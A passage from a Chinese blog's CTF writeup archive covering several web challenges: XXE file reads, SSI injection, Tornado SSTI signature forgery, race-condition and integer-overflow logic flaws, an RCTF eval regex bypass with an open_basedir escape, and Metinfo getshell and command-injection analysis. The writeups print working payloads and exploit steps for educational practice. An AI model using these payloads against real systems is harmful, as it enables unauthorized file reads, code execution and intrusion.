class="line">			break</span><br></pre></td></tr></table></figure>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-3aa8fbe13ff8acf7.png" alt></p>
<h3 id="SimpleExtensionExplorerInjection"><a href="#SimpleExtensionExplorerInjection" class="headerlink" title="SimpleExtensionExplorerInjection"></a>SimpleExtensionExplorerInjection</h3><p>题目写得很清楚这题是XXE的点，所以先抓一个http request包</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-6f46836651fe64cb.png" alt><br>application/json应该都很熟悉了，把json改成xml进行XXE注入，参考文章：<a href="https://landgrey.me/XMLBeam-XXE-Simple-Analysis/，发现构造：" target="_blank" rel="noopener">https://landgrey.me/XMLBeam-XXE-Simple-Analysis/，发现构造：</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Cyc1e<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">age</span>&gt;</span>11<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>时有一样的回显，那么就是CVE-2018-1259的洞了，构造payload：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-1722740048a470fb.png" alt></p>
<h3 id="SimplePrintEventLogger"><a href="#SimplePrintEventLogger" class="headerlink" title="SimplePrintEventLogger"></a>SimplePrintEventLogger</h3><p>这道题算非预期了，出题人木有把两个题目分开，所以导致捡漏了，看题目描述是同一个组件造成的RCE，那解法应该是参考：<a href="https://trex-tbag.github.io/2018/04/14/spring-data-common-cve/（没有去复现尝试）。" target="_blank" rel="noopener">https://trex-tbag.github.io/2018/04/14/spring-data-common-cve/（没有去复现尝试）。</a><br>由于和上一题共用同一个环境，flag都放在根目录下，那也就是文件名的问题，但是XXE是可以列目录的，构造payload：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-cda1cc7ce24b816a.png" alt></p>
<p>可以直接列出更目录，很清楚的，RCE这题的flag就摆在这了，捡漏捡漏。</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-f7c81d5cf632f968.png" alt></p>
<h3 id="SimpleServerInjection"><a href="#SimpleServerInjection" class="headerlink" title="SimpleServerInjection"></a>SimpleServerInjection</h3><p>题目提示为SSI，刚开始看成了SSTI，一直在怒怼PHP的模版注入，坑了我好一段时间……既然是SSI，那就可以利用include来尝试包含本地文件</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-67fbe593dc44f929.png" alt>我们利用include virtual，构造payload：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">name=<span class="comment">&lt;!--%23include virtual="flag" --&gt;</span></span><br></pre></td></tr></table></figure>
<p>就可以得到flag，这里主要在于#号需要urlencode一下。</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-51fe24d6a7b94456.png" alt></p>
<h3 id="SimpleWasmReverse"><a href="#SimpleWasmReverse" class="headerlink" title="SimpleWasmReverse"></a>SimpleWasmReverse</h3><p>这题最后卡wasm逆向上了，蛮写写思路</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-f218ccef0572771d.png" alt>把flag.js下载到本地分析，可以看到调用了一个flag.wasm文件</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-8443127bdac0d0e2.png" alt>)可以下载到flag.wasm进行分析，找到了一篇类似题目的writeup：<a href="https://tipi-hack.github.io/2018/04/01/quals-NDH-18-assemblyme.html，参照题目进行js调试判断调用函数，在check()函数上下断点跟进，可以看到调用了wasm中的$func53函数" target="_blank" rel="noopener">https://tipi-hack.github.io/2018/04/01/quals-NDH-18-assemblyme.html，参照题目进行js调试判断调用函数，在check()函数上下断点跟进，可以看到调用了wasm中的$func53函数</a><br><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-be2040dcaa949ed3.jpg" alt></p>
<p>所以接下来要做的主要就是反编译wasm文件，找到$func53函数进行分析，奈何wasm反编译后是3M的C源码。。。。。。而且变量名都变了，作为一个逆向只好爆破什么的来说，到这就放弃了，思路肯定是没毛病的了，分析调用的函数就可以的到flag{xxxxxx}，页面提交就可以得到flag的吧，坐等Writeup</p>
<h5 id="题目相对比较简单，差一题ak比较可惜，不过也不会逆向，木有办法，仅供学习。"><a href="#题目相对比较简单，差一题ak比较可惜，不过也不会逆向，木有办法，仅供学习。" class="headerlink" title="题目相对比较简单，差一题ak比较可惜，不过也不会逆向，木有办法，仅供学习。"></a>题目相对比较简单，差一题ak比较可惜，不过也不会逆向，木有办法，仅供学习。</h5>]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>二次注入</tag>
        <tag>XXE</tag>
        <tag>SSI</tag>
      </tags>
  </entry>
  <entry>
    <title>护网杯预选赛两个头大的Web题</title>
    <url>/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/</url>
    <content><![CDATA[<h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>拿到AAoHAR1WX1VQVlNVU1VRUl5XXyMjI1FWJ1IjUCQnXlZWXyckXhs=，提示是异或，没想到的是和多少异或，所以签到题卡了半天（菜哭），写脚本测试</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-3839db9d9d10a201.png" alt></p>
<p>每一位和0~105异或的时候可以得到flag：flag{09360535374819EEE70A4E6BA8009AB8}</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="一、EASY-TORNADO"><a href="#一、EASY-TORNADO" class="headerlink" title="一、EASY_TORNADO"></a>一、EASY_TORNADO</h2><p>在hint.txt得到了signature的算法为md5(cookie_secret + md5(filename))，有在flag.txt里得到了flag文件为/fllllllllllag，那思路很明确就是算出signature，然后读取/fllllllllllag文件里的内容就可以，其中cookie_secret是未知的，通过/error?msg= 可以发现msg参数存在ssti</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-9ad29bc329b751e2.png" alt>接下来就是爬坑的半天，下意识以为cookie_secret是在cookie里，打了半天的cookie，都不知道该调用什么函数来做了……  然后在handle对象中发现了cookie_secret（为什么会在这个地方呢，有点迷！）</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-7ca1b782b9107adb.png" alt></p>
<p>拿到cookie_secret了题目就简单了，写一个计算signature的php代码：</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-27ffeedbdb560700.png" alt></p>
<p>计算得出signature，直接访问payload：/file?filename=/fllllllllllag&amp;signature=240eaef73c2f70d5e30051d91417a18c</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-97ff2886094c7e53.png" alt></p>
<h2 id="二、ITSHOP"><a href="#二、ITSHOP" class="headerlink" title="二、ITSHOP"></a>二、ITSHOP</h2><p>这题懵了比较久，半天没有什么思路的。最终通过条件竞争和整数溢出解题。<br>首先发现可以条件竞争，因为要5包大辣条才可以换1包辣条之王，而只给了买4包的钱，那么要么通过伪造数据，要么就是条件竞争用5元买多包辣条了……这个逻辑没毛病，各种伪造测试不通，就尝试条件竞争，用brupsuit多线程跑，把线程设置大一些</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-88c5e43f56f94734.png" alt></p>
<p>就可以买到超过4包数量的大辣条。</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-e652be648b88d8db.png" alt></p>
<p>第二点在于整数溢出，毕竟想要条件竞争得到9999999*5包大辣条不可能，所以要么伪造数据，要么就是整数溢出，伪造数据前面说了是不通的，所以就尝试整数溢出,长整型整数最大为0XFFFFFFFFFFFFFFFF,那么0XFFFFFFFFFFFFFFFF + 1 就可以造成溢出，又因为5包大辣条换一包辣条之王，所以可以换的辣条之王的最大值应该是0XFFFFFFFFFFFFFFFF/5，所以批量换辣条之王的数量应该是0XFFFFFFFFFFFFFFFF/5 + 1 转化为整数为：3689348814741910324</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-f6791ad3e9d54e69.png" alt></p>
<p>成功溢出换得<strong>*****</strong>（反正用不完的）数量的辣条之王，接下来直接兑换Flag就好了</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-20e546370620f0f8-1583312993362.png" alt></p>
<h4 id="时间比较短，这两题花了些时间，然后又双叒叕开始滑水了……"><a href="#时间比较短，这两题花了些时间，然后又双叒叕开始滑水了……" class="headerlink" title="时间比较短，这两题花了些时间，然后又双叒叕开始滑水了……"></a>时间比较短，这两题花了些时间，然后又双叒叕开始滑水了……</h4>]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>逻辑</tag>
        <tag>cookie_secret</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF-R-CURSIVE</title>
    <url>/2018/10/14/RCTF-R-CURSIVE/</url>
    <content><![CDATA[<p>这次的rctf没怎么看，傍晚开始看 r-cursive 这题，源码特别简单:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) === <span class="string">'9944105bfb8294278dbf87f4c52e8476ebf9ab68'</span> ?: <span class="keyword">die</span>();</span><br><span class="line"><span class="string">';'</span> === preg_replace(<span class="string">'/[^\W_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'cmd'</span>]) ? <span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]) : show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>这里主要有正则，<code>preg_replace(&#39;/[^\W_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;cmd&#39;])</code>，\w 就很烦人了，所以首先要做的就是过这个正则达到任意执行。通过构造cmd=eval(next(getallheaders()));在请求头里插入可执行代码来达到任意执行(这里不止next可以用，主要就是决定你构造代码放在header的什么位置，还有implode，end…..都可以用)我用的是next就是，执行代码插在user_agent中：</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-c17d1e0247b7b179-1583307607135.png" alt></p>
<p>那么接下来也就是要列出目录，找到flag文件了，这里卡了好久，主要要做的就是绕过openbase_dir的限制，把出了/tmp目录和index.php所在目录除外的其他目录给列出来</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-7fd934ffcfedf20f.png" alt></p>
<p>最后通过opendir + glob://协议列出目录：</p>
<p><code>if($dh=opendir(&quot;glob:///var\*/www\*/sandbox\*/\*&quot;)){while(($file=readdir($dh))!==false){echo&quot;$file\n&quot;;}closedir($dh);}</code></p>
<p>一波谜一样的操作</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-f8dd88d7fe7e973c.png" alt></p>
<p>发现众多token文件夹后面夹生这init.php和php.ini，猜测flag应该是放在init.php里了，但是我们的权限是在 78854209fa4889d51dd0016ceab319f852d90ec9 文件夹下面的，因为vhost_alias的配置的原因，所以我们默认进入网站的时候是在token目录下的，因为openbase_dir的限制，直接读取init.php文件是读不到的</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-a753f240ddb7aaf1.png" alt></p>
<p>这里可以想想因为我们默认是在token文件夹里，所以我们可以正常读取index.php的源码，那如果我们出了token文件夹，那也就可以正常读取init.php文件了所以我们可以修改请求时的URL:<a href="http://78854209fa4889d51dd0016ceab319f852d90ec9.sandbox.r-cursive.ml:1337/78854209fa4889d51dd0016ceab319f852d90ec9/?cmd=eval(next(getallheaders()" target="_blank" rel="noopener">http://78854209fa4889d51dd0016ceab319f852d90ec9.sandbox.r-cursive.ml:1337/78854209fa4889d51dd0016ceab319f852d90ec9/?cmd=eval(next(getallheaders()</a>)); 修改请求头中的HOST为:.sandbox.r-cursive.ml:1337，利用file_get_contents()函数来读取init.php文件</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-fa9223d7f5547395.png" alt></p>
<p>这样也就跨出限制，成功读取到flag。</p>
<p><strong>比赛滑水，也就只看了这道题，其他的题看都没看，不过这次比赛题目质量真心好，有时间都可以做做，仅写来供自己学习记录用。</strong></p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>open_basedir</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>2017上海赛线下攻防Web题分析</title>
    <url>/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>首先会回过头来重新分析一次这道web题主要是因为上次线下的时候全场一直在打了一个洞，最后成信的师傅用重置数据库方法，从后台getshell一路追分，这里先膜一发。这次web题的框架是Metinfo 5.3.17的。</p>
<h2 id="0x01-后台getshell"><a href="#0x01-后台getshell" class="headerlink" title="0x01 后台getshell"></a>0x01 后台getshell</h2><p>这个洞也可以说是坑了一波，以前都调过Metinfo的后台恢复数据库文件getshell，在：安全—&gt;备份与恢复 中通过上传数据库备份.zip文件getshell，这里主要是因为:admin\include\uploadify.php</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">elseif($type==<span class="string">'skin'</span>)&#123;</span><br><span class="line">/*模板文件*<span class="regexp">/</span></span><br><span class="line"><span class="regexp">$filetype=explode('.',$_FILES['Filedata']['name']);</span></span><br><span class="line"><span class="regexp">if($filetype[count($filetype)-1]=='zip')&#123;</span></span><br><span class="line"><span class="regexp">if(stristr($met_file_format,'zip') === false)&#123;</span></span><br><span class="line"><span class="regexp">echo $lang_jsx36;</span></span><br><span class="line"><span class="regexp">die();</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/if(!is_writable('../</span>../templates/<span class="string">'))@chmod('</span>../../templates/<span class="string">',0777);</span></span><br><span class="line"><span class="string">$filenamearray=explode('</span>.zip<span class="string">',$_FILES['</span>Filedata<span class="string">']['</span>name<span class="string">']);</span></span><br><span class="line"><span class="string">$skin_if=$db-&gt;get_one("SELECT * FROM &#123;$met_skin_table&#125; WHERE skin_file='</span>&#123;$filenamearray[<span class="number">0</span>]&#125;<span class="string">'");</span></span><br><span class="line"><span class="string">if($skin_if)&#123;</span></span><br><span class="line"><span class="string">$metinfo=$lang_loginSkin;</span></span><br><span class="line"><span class="string">&#125;else&#123;</span></span><br><span class="line"><span class="string">$f = new upfile('</span>zip<span class="string">','</span>../../templates/<span class="string">','</span><span class="string">','</span><span class="string">');</span></span><br><span class="line"><span class="string">if($f-&gt;get_error())&#123;</span></span><br><span class="line"><span class="string">echo $f-&gt;get_errorcode();</span></span><br><span class="line"><span class="string">die();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if(file_exists('</span>../../templates/<span class="string">'.$filenamearray[0].'</span>.zip<span class="string">'))$filenamearray[0]='</span>metinfo<span class="string">'.$filenamearray[0];</span></span><br><span class="line"><span class="string">$met_upsql = $f-&gt;upload('</span>Filedata<span class="string">',$filenamearray[0]);</span></span><br><span class="line"><span class="string">include "pclzip.lib.php";</span></span><br><span class="line"><span class="string">$archive = new PclZip('</span>../../templates/<span class="string">'.$filenamearray[0].'</span>.zip<span class="string">');</span></span><br><span class="line"><span class="string">if($archive-&gt;extract(PCLZIP_OPT_PATH, '</span>../../templates/<span class="string">') == 0)$metinfo=$archive-&gt;errorInfo(true);</span></span><br><span class="line"><span class="string">$list = $archive-&gt;listContent();</span></span><br><span class="line"><span class="string">$error=0;</span></span><br><span class="line"><span class="string">foreach($list as $key=&gt;$val)&#123;</span></span><br><span class="line"><span class="string">if(preg_match("/\.(asp|aspx|jsp)/i",$val[filename]))&#123;</span></span><br><span class="line"><span class="string">$error=1;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if(!is_dir('</span>../../templates/<span class="string">'.$val[filename])&amp;&amp;preg_match("/\.(php)/i",$val[filename]))&#123;</span></span><br><span class="line"><span class="string">$danger=explode('</span><span class="params">|','preg_replace|</span>assert<span class="params">|dirname|</span>file_exists<span class="params">|file_get_contents|</span>file_put_contents<span class="params">|fopen|</span>mkdir<span class="params">|unlink|</span>readfile<span class="params">|eval|</span>cmd<span class="params">|passthru|</span>system<span class="params">|gzuncompress|</span>exec<span class="params">|shell_exec|</span>fsockopen<span class="params">|pfsockopen|</span>proc_open<span class="params">|scandir');</span></span><br><span class="line"><span class="params">$ban='preg_replace|</span>assert<span class="params">|eval|</span>\$_POST<span class="params">|\$_GET';</span></span><br><span class="line"><span class="params">foreach($danger as $key1 =&gt; $val1)&#123;</span></span><br><span class="line"><span class="params">$str=file_get_contents('../../templates/'.$val[filename]);</span></span><br><span class="line"><span class="params">$str=str_replace(array('\'','"','.'),'',$str);</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>(preg_match("/([^A-Za-z0-9_]$val1)[\r\n\t]&#123;0,&#125;([\[\(])/i",$str))&#123;</span></span><br><span class="line"><span class="params">$error=1;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>(preg_match('/('.$ban.')/i',$str))&#123;</span></span><br><span class="line"><span class="params">$error=1;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">@unlink('../../templates/'.$filenamearray[0].'.zip');</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>($error)&#123;</span></span><br><span class="line"><span class="params">foreach($list as $key=&gt;$val)&#123;</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>(is_dir('../../templates/'.$val[filename]))&#123;</span></span><br><span class="line"><span class="params">@deldir('../../templates/'.$val[filename]);</span></span><br><span class="line"><span class="params">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="params">@unlink('../../templates/'.$val[filename]);</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">$metinfo='含有危险函数，禁止上传！！';</span></span><br><span class="line"><span class="params">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="params">$metinfo='1$'.$filenamearray[0];</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br></pre></td></tr></table></figure>
<p>上传的.zip文件会自动解压，上传成功后在/templates目录下生成shell，由于本次源码被调整过，在恢复备份文件处有一个资源调用的问题，导致打开的时候特别慢，可以说没法利用吧，而这次主要是利用另一个上传点，直接通过修改上传文件类型来上传.php文件：安全-&gt;安全与效率-&gt;上传文件<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-bc2325f23d35affd.png" alt><br>这种getshell的方法不要智商的，所以就不多说了。</p>
<h2 id="0x02-混淆源码命令执行"><a href="#0x02-混淆源码命令执行" class="headerlink" title="0x02 混淆源码命令执行"></a>0x02 混淆源码命令执行</h2><p>利用点：produ/picture.inc.php文件，源码进行混淆过，所以挖掘的时候必须首先解混淆，这里我是直接上网进行源码修复的，修复出来简单修改一下变量也基本就能看懂。</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># MetInfo Enterprise Content Management System </span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co.,Ltd (http:</span></span><br><span class="line">$b=@$_GET[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Y2hlYw=='</span>)];</span><br><span class="line"><span class="keyword">if</span> ($b!=<span class="string">""</span>) </span><br><span class="line">&#123;</span><br><span class="line">	$a = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSUkx'</span>)](md5($b),<span class="number">0</span>,<span class="number">9</span>);</span><br><span class="line">	$c = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSUkx'</span>)](md5($a),<span class="number">5</span>,<span class="number">18</span>);</span><br><span class="line">	$c = md5($c);</span><br><span class="line">	echo $c;</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$d = @$_GET[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'img_tet'</span>)];</span><br><span class="line">$d = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSWwx'</span>)]($d);</span><br><span class="line">$d = str_replace( $GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'flag'</span>),<span class="string">""</span>,$d);</span><br><span class="line"><span class="keyword">if</span> ($d!=<span class="string">""</span>) </span><br><span class="line">&#123;</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFJ'</span>)]($GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Content-Type: imgage/jpeg'</span>));</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFJ'</span>)]($GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Content-Disposition: attachment; filename='</span>).$d);</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFJ'</span>)]($GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Content-Lengh: '</span>).$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFs'</span>)]($d));</span><br><span class="line">	$e = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJbElJ'</span>)]($d,<span class="string">"r"</span>) <span class="keyword">or</span> die(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">	$f = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJbEkx'</span>)]($e,$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFs'</span>)]($d));</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJbGxJ'</span>)]($e);</span><br><span class="line">	echo $f;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">echo $GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Cg=='</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>也就是Get一个参数img_tet,检测传参内容是否有flag，有的话就替换为空格所以直接利用：cat /flflagag就可以绕过检测，这也是全场一次在打的一个洞。下面也贴出其他师傅解混淆的方法，建一个php文件</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'picture.inc.php'</span>);</span><br><span class="line">var_dump(get_defined_vars());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
